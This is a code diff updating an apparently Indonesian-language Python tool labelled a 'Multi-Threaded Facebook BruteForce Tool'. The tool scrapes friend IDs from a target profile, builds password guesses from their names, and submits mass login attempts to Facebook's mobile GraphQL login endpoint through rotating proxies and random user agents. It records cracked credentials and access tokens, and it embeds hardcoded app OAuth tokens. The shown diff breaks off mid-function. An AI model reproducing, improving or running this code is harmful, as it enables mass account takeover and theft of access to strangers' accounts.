@@ -1,46 +1,50 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-try:
-    import os
-    import requests
-    import json
-    import rich
-    import time
-    import datetime
-    import re
-    import random
-    import uuid
-    import sys
-    import urllib.parse
-    import base64
-    import gzip
-    import threading
-    import hmac
-    import hashlib
-    import struct
-    import io
-    import binascii
-    from concurrent.futures import ThreadPoolExecutor, as_completed
-    from Cryptodome import Random
-    from Cryptodome.Cipher import AES, PKCS1_v1_5
-    from Cryptodome.PublicKey import RSA
-    from Cryptodome.Random import get_random_bytes
-except ImportError as ie:
-    try:
-        os.system('pip install {}'.format(ie.name))
-    except Exception:
-        print(str(ie))
-
+import os
+import requests
+import json
+import time
+import datetime
+import re
+import random
+import uuid
+import sys
+import urllib.parse
+import base64
+import gzip
+import threading
+import hmac
+import hashlib
+import struct
+import io
+import binascii
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from Cryptodome import Random
+from Cryptodome.Cipher import AES, PKCS1_v1_5
+from Cryptodome.PublicKey import RSA
+from Cryptodome.Random import get_random_bytes
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
-from io import BytesIO
 from urllib.parse import urlencode
 from time import sleep
 from string import ascii_letters
-from rich.panel import Panel
-from rich.console import Console
-from rich import print as KenXinDev
+from io import BytesIO
+
+# Rich untuk tampilan (dengan fallback jika tidak ada)
+try:
+    from rich.panel import Panel
+    from rich.console import Console
+    from rich import print as rprint
+    RICH_AVAILABLE = True
+except ImportError:
+    RICH_AVAILABLE = False
+    def rprint(*args, **kwargs):
+        print(*args)
+    class Panel:
+        def __init__(self, content, **kwargs):
+            self.content = content
+        def __str__(self):
+            return str(self.content)
 
 day = datetime.now().strftime("%d-%m-%Y")
 temp_dump = []
@@ -73,17 +77,20 @@ def Banner():
                              
         [underline bright_black]Multi-Threaded Facebook BruteForce Tool[/]
         [bold bright_black]Author: KenXinDev[/]"""
-    KenXinDev(Panel(logo, width=80, style='bold bright_black'))
+    rprint(Panel(logo, width=80, style='bold bright_black'))
 
 def KenXinInput():
-    return Console().input("[bold bright_black]   ╰─> ")
+    if RICH_AVAILABLE:
+        return Console().input("[bold bright_black]   ╰─> ")
+    else:
+        return input("   ╰─> ")
 
 def KenXin_Error(message: str):
-    KenXinDev(f'[bold bright_black]   ──> [bold red]{message}', end='\r')
+    rprint(f'[bold bright_black]   ──> [bold red]{message}', end='\r')
     return None
 
 def KenXin_Warning(message: str):
-    KenXinDev(f'[bold bright_black]   ──> [bold yellow]{message}', end='\r')
+    rprint(f'[bold bright_black]   ──> [bold yellow]{message}', end='\r')
     return None
 
 def create_folders():
@@ -119,11 +126,11 @@ def getproxy(sock=False):
 def load_proxies():
     global proxies_list
     Banner()
-    KenXinDev(Panel("[bold white]Gunakan proxy?\n[1] Ya (ambil dari API)\n[2] Ya (dari file socks4.txt)\n[3] Tidak (tanpa proxy)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Proxy Settings] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+    rprint(Panel("[bold white]Gunakan proxy?\n[1] Ya (ambil dari API)\n[2] Ya (dari file socks4.txt)\n[3] Tidak (tanpa proxy)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Proxy Settings] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
     choice = KenXinInput()
     raw_proxies = []
     if choice == '1':
-        KenXinDev("[bold yellow]Mengambil proxy dari API...[/]")
+        rprint("[bold yellow]Mengambil proxy dari API...[/]")
         raw_proxies = getproxy(False)
         if not raw_proxies:
             KenXin_Warning("API kosong, coba file local...")
@@ -140,13 +147,13 @@ def load_proxies():
                         continue
                     ip, port = line.split(':', 1)
                     raw_proxies.append(f"http://{ip}:{port}")
-            KenXinDev(f"[bold yellow]✓ {len(raw_proxies)} proxy dari file[/]")
+            rprint(f"[bold yellow]✓ {len(raw_proxies)} proxy dari file[/]")
         else:
             KenXin_Warning("File socks4.txt tidak ditemukan, tanpa proxy.")
             proxies_list.clear()
             return
     else:
-        KenXinDev("[bold yellow]Berjalan tanpa proxy.[/]")
+        rprint("[bold yellow]Berjalan tanpa proxy.[/]")
         proxies_list.clear()
         return
 
@@ -155,7 +162,7 @@ def load_proxies():
         proxies_list.clear()
         return
 
-    KenXinDev(f"[bold yellow]Memvalidasi {len(raw_proxies)} proxy...[/]")
+    rprint(f"[bold yellow]Memvalidasi {len(raw_proxies)} proxy...[/]")
     valid = []
     with ThreadPoolExecutor(max_workers=30) as executor:
         futures = {executor.submit(validate_proxy, p): p for p in raw_proxies}
@@ -164,7 +171,7 @@ def load_proxies():
             if future.result():
                 valid.append(proxy)
     proxies_list = valid
-    KenXinDev(f"[bold green]✓ {len(proxies_list)} proxy valid siap digunakan.[/]")
+    rprint(f"[bold green]✓ {len(proxies_list)} proxy valid siap digunakan.[/]")
     if not proxies_list:
         KenXin_Warning("Tidak ada proxy valid, melanjutkan tanpa proxy.")
 
@@ -190,33 +197,49 @@ def load_from_file():
                     continue
                 ip, port = line.split(':', 1)
                 proxies_list.append(f"http://{ip}:{port}")
-        KenXinDev(f"[bold green]✓ Loaded {len(proxies_list)} proxy dari {proxy_file}[/]")
+        rprint(f"[bold green]✓ Loaded {len(proxies_list)} proxy dari {proxy_file}[/]")
     else:
         KenXin_Warning("File socks4.txt tidak ditemukan, berjalan tanpa proxy.")
         proxies_list.clear()
 
-# ==================== ENKRIPSI PASSWORD (TETAP ADA, TAPI TIDAK DIPANGGIL DI SMARTLOCK) ====================
+# ==================== ENKRIPSI PASSWORD (VERSI BARU DENGAN CACHE & FALLBACK) ====================
 class Encrypt_PWD:
-    def __init__(self):
-        pass
+    _public_key = None
+    _key_id = None
+
+    @classmethod
+    def _fetch_public_key(cls):
+        if cls._public_key and cls._key_id:
+            return cls._public_key, cls._key_id
+        try:
+            url = 'https://b-graph.facebook.com/pwd_key_fetch'
+            params = {
+                'version': '2',
+                'flow': 'CONTROLLER_INITIALIZATION',
+                'method': 'GET',
+                'fb_api_req_friendly_name': 'pwdKeyFetch',
+                'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
+                'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
+            }
+            resp = requests.get(url, params=params, timeout=10)
+            resp.raise_for_status()
+            data = resp.json()
+            pub = data.get('public_key')
+            kid = str(data.get('key_id', '25'))
+            if pub:
+                cls._public_key = pub
+                cls._key_id = kid
+                return pub, kid
+        except Exception:
+            pass
+        return None, None
 
     def PWD_FB4A(self, password, public_key=None, key_id="25"):
         if public_key is None:
-            try:
-                pwd_key_fetch = 'https://b-graph.facebook.com/pwd_key_fetch'
-                pwd_key_fetch_data = {
-                    'version': '2',
-                    'flow': 'CONTROLLER_INITIALIZATION',
-                    'method': 'GET',
-                    'fb_api_req_friendly_name': 'pwdKeyFetch',
-                    'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
-                    'access_token': '438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28'
-                }
-                response = requests.post(pwd_key_fetch, params=pwd_key_fetch_data).json()
-                public_key = response.get('public_key')
-                key_id = str(response.get('key_id', key_id))
-            except Exception as e:
-                return f"#PWD_FB4A:0:0:"
+            public_key, key_id = self._fetch_public_key()
+            if not public_key:
+                # fallback ke #PWD_MSGR jika public key gagal
+                return self._PWD_MSGR(password)
         try:
             rand_key = get_random_bytes(32)
             iv = get_random_bytes(12)
@@ -237,9 +260,19 @@ class Encrypt_PWD:
             encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
             return f"#PWD_FB4A:2:{current_time}:{encoded}"
         except Exception:
-            return f"#PWD_FB4A:0:0:"
+            return self._PWD_MSGR(password)
 
-# ==================== CLASS LoginFacebook ====================
+    @staticmethod
+    def _PWD_MSGR(password, timestamp=None):
+        if timestamp is None:
+            timestamp = int(time.time())
+        key_hex = "b6a5b6a5b6a5b6a5b6a5b6a5b6a5b6a5"
+        key = bytes.fromhex(key_hex)
+        h = hmac.new(key, password.encode('utf-8'), hashlib.sha256)
+        hash_b64 = base64.b64encode(h.digest()).decode('utf-8')
+        return f"#PWD_MSGR:2:{timestamp}:{hash_b64}"
+
+# ==================== CLASS LoginFacebook (tetap) ====================
 class LoginFacebook:
     def __init__(self):
         self.url = "https://adsmanager.facebook.com/adsmanager/onboarding"
@@ -250,7 +283,7 @@ class LoginFacebook:
             self.token = open('data/token.txt', 'r', encoding='utf-8').read()
         except FileNotFoundError:
             Banner()
-            KenXinDev(Panel("[bold white]Masukan cookie facebook anda, pastikan anda menggunakan akun tumbal jangan menggunakan akun pribadi", width=80, style="bold bright_black", title="[bold bright_black]>> [Login Required] <<[/]", subtitle="[bold bright_black]╭──────", subtitle_align="left"))
+            rprint(Panel("[bold white]Masukan cookie facebook anda, pastikan anda menggunakan akun tumbal jangan menggunakan akun pribadi", width=80, style="bold bright_black", title="[bold bright_black]>> [Login Required] <<[/]", subtitle="[bold bright_black]╭──────", subtitle_align="left"))
             coki = KenXinInput()
             if not coki:
                 KenXin_Error("Invalid Cookie!!")
@@ -272,7 +305,7 @@ class LoginFacebook:
                         f.write(coki)
                     with open("data/token.txt", "w", encoding="utf-8") as f:
                         f.write(access_token)
-                    KenXinDev(Panel("[bold green]Login berhasil, silahkan jalankan ulang tools[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Login Successful] <<[/]"))
+                    rprint(Panel("[bold green]Login berhasil, silahkan jalankan ulang tools[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Login Successful] <<[/]"))
                     sleep(3)
                     sys.exit()
             except Exception as e:
@@ -325,14 +358,14 @@ class LoginFacebook:
             KenXin_Error("Error: " + str(e).title())
             sys.exit()
 
-# ==================== CLASS Facebook ====================
+# ==================== CLASS Facebook (dengan smartlock_login yang diperbaiki) ====================
 class Facebook:
     def __init__(self, cookie, token, nama, uid):
         self.cookie = cookie
         self.token = token
         self.nama = nama
         self.idz = uid
-        self.enc = Encrypt_PWD()  # class enkripsi tetap ada
+        self.enc = Encrypt_PWD()
 
     # ---------- Random User-Agent Generator ----------
     def generate_facebook_user_agent(self) -> tuple:
@@ -375,8 +408,8 @@ class Facebook:
 
     def logo(self):
         Banner()
-        KenXinDev(Panel(f"[bold white]Name: [bold red]{self.nama}[/bold red]\nUid: [bold red]{self.idz}[/bold red]\nAccessToken: [bold red]{self.token[:20]}***[/]", style="bold bright_black", title="[bold bright_black]>> [Account Info] <<[/]", width=80))
-        KenXinDev(Panel("[bold white][01] Dump id publik\n[02] Crack dari file dump (userid<=>fullname)\n[03] Check result crack\n[04] Crack dari file user|pass\n[00] Logout[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Tools Menu] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+        rprint(Panel(f"[bold white]Name: [bold red]{self.nama}[/bold red]\nUid: [bold red]{self.idz}[/bold red]\nAccessToken: [bold red]{self.token[:20]}***[/]", style="bold bright_black", title="[bold bright_black]>> [Account Info] <<[/]", width=80))
+        rprint(Panel("[bold white][01] Dump id publik\n[02] Crack dari file dump (userid<=>fullname)\n[03] Check result crack\n[04] Crack dari file user|pass\n[00] Logout[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Tools Menu] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
 
     def menu(self):
         self.logo()
@@ -407,7 +440,7 @@ class Facebook:
     # ==================== MENU 1: DUMP ID PUBLIK ====================
     def dumpId_public(self, after=''):
         try:
-            KenXinDev(Panel("[bold white]Masukan id target, pastikan pertemanan target bersifat publik dan memiliki teman[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Dump User] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+            rprint(Panel("[bold white]Masukan id target, pastikan pertemanan target bersifat publik dan memiliki teman[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Dump User] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
             targetId = KenXinInput()
             if not targetId:
                 KenXin_Warning("Target jangan kosong!")
@@ -430,7 +463,7 @@ class Facebook:
                             fullname = user.get('name')
                             temp_dump.append(f"{userid}<=>{fullname}\n")
                             open(f'temp/dump-{targetId}.txt', 'a', encoding='utf-8').write(f"{userid}<=>{fullname}\n")
-                        KenXinDev(f"[bold white]# berhasil mengumpulkan {len(temp_dump)} user...[/]", end='\r')
+                        rprint(f"[bold white]# berhasil mengumpulkan {len(temp_dump)} user...[/]", end='\r')
                         cursors = response.get('paging', {}).get('cursors', {})
                         if 'after' in cursors:
                             after = cursors['after']
@@ -448,7 +481,7 @@ class Facebook:
 
     # ==================== MENU 2: CRACK DARI FILE DUMP ====================
     def crack_from_dump_file(self):
-        KenXinDev(Panel("[bold white]Crack dari file dump (format: userid<=>fullname)\n[1] Pilih dari file dump yang tersimpan di folder temp\n[2] Masukkan path file manual[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Crack Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+        rprint(Panel("[bold white]Crack dari file dump (format: userid<=>fullname)\n[1] Pilih dari file dump yang tersimpan di folder temp\n[2] Masukkan path file manual[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Crack Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
         pilihan = KenXinInput()
         if pilihan == '1':
             temp_files = [f for f in os.listdir("temp") if f.startswith("dump-") and f.endswith(".txt")]
@@ -457,10 +490,10 @@ class Facebook:
                 sleep(2)
                 self.menu()
                 return
-            KenXinDev(Panel("[bold white]Pilih file dump yang ingin digunakan:[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Select Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+            rprint(Panel("[bold white]Pilih file dump yang ingin digunakan:[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Select Dump File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
             for idx, f in enumerate(temp_files, start=1):
-                KenXinDev(f"[bold white]{idx}. {f}[/]")
-            KenXinDev("[bold white]0. Kembali ke menu[/]")
+                rprint(f"[bold white]{idx}. {f}[/]")
+            rprint("[bold white]0. Kembali ke menu[/]")
             choice = KenXinInput()
             if choice == '0':
                 self.menu()
@@ -480,7 +513,7 @@ class Facebook:
                 self.crack_from_dump_file()
                 return
         elif pilihan == '2':
-            KenXinDev(Panel("[bold white]Masukkan path file dump (contoh: temp/dump-123456.txt)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Manual File Path] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+            rprint(Panel("[bold white]Masukkan path file dump (contoh: temp/dump-123456.txt)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Manual File Path] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
             file_path = KenXinInput()
             if not file_path:
                 KenXin_Warning("Path file tidak boleh kosong!")
@@ -522,7 +555,7 @@ class Facebook:
             self.menu()
             return
 
-        KenXinDev(f"[bold green]✓ {len(accounts)} akun berhasil dimuat dari file dump.[/]")
+        rprint(f"[bold green]✓ {len(accounts)} akun berhasil dimuat dari file dump.[/]")
         sleep(1)
         global temp_dump
         temp_dump = [f"{uid}<=>{nama}" for uid, nama in accounts]
@@ -530,7 +563,7 @@ class Facebook:
 
     # ==================== MENU 4: CRACK DARI FILE USER|PASS ====================
     def crack_from_file_pass(self):
-        KenXinDev(Panel("[bold white]Masukkan path file akun (format: user|password per baris)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Load File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
+        rprint(Panel("[bold white]Masukkan path file akun (format: user|password per baris)[/]", width=80, style="bold bright_black", title="[bold bright_black]>> [Load File] <<[/]", subtitle_align="left", subtitle="[bold bright_black]╭──────"))
         file_path = KenXinInput()
         if not file_path:
             KenXin_Warning("File path tidak boleh kosong!")
@@ -568,7 +601,7 @@ class Facebook:
             self.menu()
             return
 
-        KenXinDev(f"[bold green]✓ {len(accounts)} akun berhasil dimuat.[/]")
+        rprint(f"[bold green]✓ {len(accounts)} akun berhasil dimuat.[/]")
         sleep(1)
         self.settings(accounts)
 
@@ -601,15 +634,15 @@ class Facebook:
 [bold bright_black]📁 File Sukses    : {success_file}
 📁 File Checkpoint : {checkpoint_file}[/bold bright_black]"""
 
-        KenXinDev(Panel(info, width=80, style='bold bright_black', title='[bold bright_black]>> [Result Info] <<[/]'))
-        KenXinDev("[bold white]Tekan Enter untuk kembali ke menu...[/]")
+        rprint(Panel(info, width=80, style='bold bright_black', title='[bold bright_black]>> [Result Info] <<[/]'))
+        rprint("[bold white]Tekan Enter untuk kembali ke menu...[/]")
         input()
         self.menu()
 
     # ==================== SETTINGS DAN EKSEKUSI ====================
     def settings(self, accounts=None):
         print()
-        KenXinDev(Panel('''[bold white]01. Nama 1-4            02. Nama 1-5
+        rprint(Panel('''[bold white]01. Nama 1-4            02. Nama 1-5
 03. Nama 1-6            04. Nama 1-6 + Kombinasi manual
 05. Manual Password     00. Back to Menu[/]''', style='bold bright_black', width=80, title='[bold bright_black]>> [Password Settings] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
         kombinasi = KenXinInput()
@@ -620,7 +653,7 @@ class Facebook:
         elif kombinasi in ('03','3'):
             self.exec_method(kombinasi, accounts=accounts)
         elif kombinasi in ('04','4'):
-            KenXinDev(Panel('[bold white]Masukan password kombinasi manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]',style='bold bright_black', width=80, title='[bold bright_black]>> [Kombinasi Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
+            rprint(Panel('[bold white]Masukan password kombinasi manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]',style='bold bright_black', width=80, title='[bold bright_black]>> [Kombinasi Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
             manual_password = KenXinInput()
             if not manual_password:
                 KenXin_Warning('Password manual harus diisi!!')
@@ -628,7 +661,7 @@ class Facebook:
                 self.settings(accounts)
             self.exec_method(kombinasi, manual_password, accounts)
         elif kombinasi in ('05','5'):
-            KenXinDev(Panel('[bold white]Masukan password manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [Manual Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
+            rprint(Panel('[bold white]Masukan password manual anda, dan gunakan tanda ([bold green]koma[/bold green]) sebagai pemisah.[/]', style='bold bright_black', width=80, title='[bold bright_black]>> [Manual Password] <<', subtitle='[bold bright_black]╭──────', subtitle_align='left'))
             manual_password = KenXinInput()
             if not manual_password:
                 KenXin_Warning('Password manual harus diisi!!')
@@ -666,7 +699,7 @@ class Facebook:
                     KenXin_Error(f'Terjadi error: {str(e)}')
                     time.sleep(3)
         print()
-        KenXinDev(Panel('[bold white]Crack telah selesai dengan hasil ok dan cp : [bold green]{}[/bold green]/[bold yellow]{}[/bold yellow][/]'.format(log["success"], log['checkpoint']), width=80, style='bold bright_black', title='[bold bright_black]>> [Facebook Info] <<[/]'))
+        rprint(Panel('[bold white]Crack telah selesai dengan hasil ok dan cp : [bold green]{}[/bold green]/[bold yellow]{}[/bold yellow][/]'.format(log["success"], log['checkpoint']), width=80, style='bold bright_black', title='[bold bright_black]>> [Facebook Info] <<[/]'))
         time.sleep(3)
         sys.exit()
 
@@ -732,105 +765,233 @@ class Facebook:
 
         return passwords
 
-    # ==================== METODE SMARTLOCK (PLAIN PASSWORD, RANDOM UA) ====================
+    # ==================== METODE SMARTLOCK (VERSI BARU DENGAN GRAPHQL + FALLBACK) ====================
     def smartlock_login(self, user, passwords):
         global log
-        KenXinDev(f'[bold bright_black]   ──> [bold white]Crack {user[:8]}/{len(temp_dump)}/[bold green]{log["success"]}[/bold green]/[bold yellow]{log["checkpoint"]}[/bold yellow]/{log["loop"]}[/]', end='\r')
+        rprint(f'[bold bright_black]   ──> [bold white]Crack {user[:8]}/{len(temp_dump)}/[bold green]{log["success"]}[/bold green]/[bold yellow]{log["checkpoint"]}[/bold yellow]/{log["loop"]}[/]', end='\r')
         for pwd in passwords:
-                try:
-                    # Enkripsi password
-                    encrypted_pass = self.enc.PWD_FB4A(pwd)
-                    # Random user-agent & locale
-                    ua_str, loc = self.generate_facebook_user_agent()
-                    curl = requests.Session()
-                    curl.headers.update({
-                        'Host': 'b-graph.facebook.com',
-                        'Authorization': 'OAuth 121876164619130|1ab2c5c902faedd339c14b2d58e929dc',
-                        'x-fb-request-analytics-tags': '{"network_tags":{"product":"121876164619130","purpose":"none","retry_attempt":"0"},"application_tags":"graphservice"}',
-                        'x-fb-connection-type': 'WIFI',
-                        'app-scope-id-header': 'd2c663d1-ed7c-471d-bd58-f4a78f1d3acc',
-                        'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
-                        'x-zero-f-device-id': str(uuid.uuid4()),
-                        'x-zero-state': 'unknown',
-                        'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'x-graphql-client-library': 'graphservice',
-                        'x-tigon-is-retry': 'False',
-                        'x-fb-http-engine': 'Tigon/Liger',
-                        'x-fb-client-ip': 'True',
-                        'x-fb-server-cluster': 'True',
-                        'x-fb-conn-uuid-client': '4ZGi+CQFuIQjbQ3okjarGQ==',
-                        'user-agent': ua_str,
-                        'Accept-Encoding': 'gzip, deflate',
-                    })
+            try:
+                # Enkripsi password (otomatis fallback ke MSGR jika perlu)
+                encrypted_pass = self.enc.PWD_FB4A(pwd)
+                ua_str, loc = self.generate_facebook_user_agent()
+                session = requests.Session()
 
-                    data = {
-                        'method': 'post',
-                        'pretty': 'false',
-                        'format': 'json',
-                        'server_timestamps': 'true',
-                        'locale': loc,
-                        'purpose': 'fetch',
-                        'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
-                        'fb_api_caller_class': 'graphservice',
-                        'client_doc_id': '11994080425603935587861051615',
-                        'variables': json.dumps({
-                            'params': {
-                                'params': json.dumps({
-                                    'server_params': {
-                                        'family_device_id': str(uuid.uuid4()),
-                                        'device_id': str(uuid.uuid4()),
-                                        'machine_id': '',
-                                        'from_native_screen': True,
-                                        'contact_point': user,
-                                        'encrypted_password': encrypted_pass
-                                    }
-                                }),
-                                'bloks_versioning_id': '6a1b3a2ff800611f4dcdecf474aacd60e3165beeab0cf68891c553a6a2862720',
-                                'app_id': 'com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request'
-                            },
-                            'scale': '1.5',
-                            'nt_context': {
-                                'using_white_navbar': True,
-                                'styles_id': '790c12baa860bb932decc340a5291740',
-                                'pixel_ratio': 1.5,
-                                'is_push_on': True,
-                                'debug_tooling_metadata_token': None,
-                                'is_flipper_enabled': False,
-                                'theme_params': [],
-                                'bloks_version': '6a1b3a2ff800611f4dcdecf474aacd60e3165beeab0cf68891c553a6a2862720'
-                            }
-                        }),
-                        'fb_api_analytics_tags': '["GraphServices"]',
-                        'client_trace_id': str(uuid.uuid4())
+                headers = {
+                    'User-Agent': ua_str,
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'x-tigon-is-retry': 'False',
+                    'x-fb-connection-type': 'WIFI',
+                    'x-graphql-client-library': 'graphservice',
+                    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
+                    'content-encoding': 'gzip',
+                    'x-fb-net-hni': '31016',
+                    'x-fb-sim-hni': '31016',
+                    'authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
+                    'x-fb-request-analytics-tags': '{"network_tags":{"product":"256002347743983","purpose":"none","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
+                    'x-fb-http-engine': 'Liger',
+                    'x-fb-client-ip': 'True',
+                    'x-fb-server-cluster': 'True',
+                }
+
+                # Generate random IDs
+                device_id = str(uuid.uuid4())
+                family_id = str(uuid.uuid4())
+                secure_family_id = str(uuid.uuid4())
+                waterfall_id = str(uuid.uuid4())
+                trace_id = str(uuid.uuid4())
+
+                client_input_params = {
+                    "block_store_machine_id": "",
+                    "contact_point": user,
+                    "aymh_accounts": [],
+                    "fb_ig_device_id": [],
+                    "has_granted_read_contacts_permissions": 0,
+                    "cloud_trust_token": None,
+                    "password_contains_non_ascii": "false",
+                    "zero_balance_state": "",
+                    "has_granted_read_phone_permissions": 0,
+                    "accounts_list": [],
+                    "has_whatsapp_installed": 0,
+                    "sim_phones": [""],
+                    "headers_infra_flow_id": "",
+                    "event_step": "home_page",
+                    "client_known_key_hash": "",
+                    "app_manager_id": "",
+                    "password": encrypted_pass,
+                    "event_flow": "login_manual",
+                    "openid_tokens": {},
+                    "family_device_id": family_id,
+                    "machine_id": "",
+                    "should_show_nested_nta_from_aymh": 0,
+                    "try_num": 1,
+                    "login_attempt_count": 1,
+                    "device_id": device_id,
+                    "auth_secure_device_id": "",
+                    "encrypted_msisdn": "",
+                    "sso_token_map_json_string": "",
+                    "device_emails": [],
+                    "lois_settings": {"lois_token": ""},
+                    "secure_family_device_id": secure_family_id,
+                }
+
+                server_params = {
+                    "is_platform_login": 0,
+                    "login_credential_type": "none",
+                    "should_trigger_override_login_2fa_action": 0,
+                    "is_from_logged_in_switcher": 0,
+                    "two_step_login_type": "one_step_login",
+                    "waterfall_id": waterfall_id,
+                    "is_from_msplit_fallback": 0,
+                    "pw_encryption_try_count": 1,
+                    "server_login_source": "login",
+                    "ar_event_source": "login_home_page",
+                    "is_from_password_entry_page": 0,
+                    "INTERNAL__latency_qpl_marker_id": 36707139,
+                    "is_caa_perf_enabled": 1,
+                    "is_from_empty_password": 0,
+                    "is_from_landing_page": 0,
+                    "is_from_logged_out": 0,
+                    "is_from_assistive_id": 0,
+                    "family_device_id": family_id,
+                    "reg_flow_source": "login_home_native_integration_point",
+                    "is_from_aymh": 0,
+                    "credential_type": "password",
+                    "is_vanilla_password_page_empty_password": 0,
+                    "username_text_input_id": "3ji67x:86",
+                    "password_text_input_id": "3ji67x:87",
+                    "layered_homepage_experiment_group": None,
+                    "access_flow_version": "pre_mt_behavior",
+                    "offline_experiment_group": "caa_iteration_v3_perf_msg_6",
+                    "INTERNAL__latency_qpl_instance_id": 2.1415910100247e13,
+                    "device_id": device_id,
+                    "login_source": "Login",
+                    "caller": "gslr",
+                    "should_trigger_override_login_success_action": 0
+                }
+
+                params_dict = {
+                    "client_input_params": client_input_params,
+                    "server_params": server_params
+                }
+                params_json = json.dumps(params_dict, separators=(',', ':'), ensure_ascii=False)
+                params_string = f"{{params:{params_json}}}"
+
+                variables = {
+                    "params": {
+                        "params": params_string,
+                        "bloks_versioning_id": "3597b7ec4c1d84726afee9afeac5d20505a1c6f0ff7be1e408afb1b3c36bb936",
+                        "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
+                    },
+                    "scale": "2",
+                    "nt_context": {
+                        "using_white_navbar": True,
+                        "styles_id": "56095d13d2465224983c0303bebdc142",
+                        "is_flipper_enabled": False,
+                        "pixel_ratio": 2,
+                        "is_push_on": True,
+                        "bloks_version": "3597b7ec4c1d84726afee9afeac5d20505a1c6f0ff7be1e408afb1b3c36bb936"
                     }
+                }
 
-                    response = curl.post(
-                        "https://b-graph.facebook.com/graphql",data=data).json()
-                    if response.get('data') and response['data'].get('fb_bloks_action') and response['data']['fb_bloks_action'].get('root_action'):
-                        server_respon1 = response['data']['fb_bloks_action']['root_action']['action']['action_bundle']['bloks_bundle_action']
-                        server_respon2 = server_respon1.replace('\\', '')
-                        if 'session_key' in server_respon2 or 'EAAAAU' in server_respon2:
-                            log['success'] += 1
-                            token = re.search(r'"access_token":"([^"]+)"', server_respon2).group(1)
-                            KenXinDev(Panel(Panel(f"[bold green][+] Username : {user}\n[+] Password : {pwd}\n[+] Access Token : {token}\n[+] User Agent : {ua_str}[/bold green]", style='bold green'), width=80, style='bold bright_black', title='[bold green]Login-Success[/bold green]'))
-                            open(file_result["success"], 'a', encoding='utf-8').write(f"{user}|{pwd}|{token}\n")
-                            break
-                        elif 'redirect_login_challenges' in server_respon2 or 'com.bloks.www.ap.two_step_verification.entrypoint_async' in server_respon2:
-                            log['checkpoint'] += 1
-                            KenXinDev(Panel(Panel(f"[bold yellow][+] Username : {user}\n[+] Password : {pwd}\n[+] User Agent : {ua_str}[/bold yellow]", style='bold yellow'), width=80, style='bold bright_black', title='[bold yellow]Login-Checkpoint[/bold yellow]'))
-                            open(file_result['checkpoint'], 'a', encoding='utf-8').write(f"{user}|{pwd}\n")
-                            break
-                        else:
-                            continue
-                    
-                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
-                    KenXin_Warning('Koneksi Internet Error!')
-                    time.sleep(5)
-                    self.smartlock_login(user, passwords)
-                    log['loop'] -= 1
-                    break
-                except Exception as e:pass
+                payload = {
+                    "method": "post",
+                    "pretty": "false",
+                    "format": "json",
+                    "server_timestamps": "true",
+                    "locale": loc,
+                    "fb_api_req_friendly_name": "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
+                    "fb_api_caller_class": "graphservice",
+                    "client_doc_id": "119940804212680571989635254761",
+                    "variables": json.dumps(variables, separators=(',', ':')),
+                    "fb_api_analytics_tags": json.dumps(["GraphServices"], separators=(',', ':')),
+                    "client_trace_id": trace_id,
+                }
+
+                # Gzip payload
+                data_str = urlencode(payload)
+                compressed_data = gzip.compress(data_str.encode('utf-8'))
+                headers["x-fb-ta-logging-ids"] = f"graphql:{trace_id}"
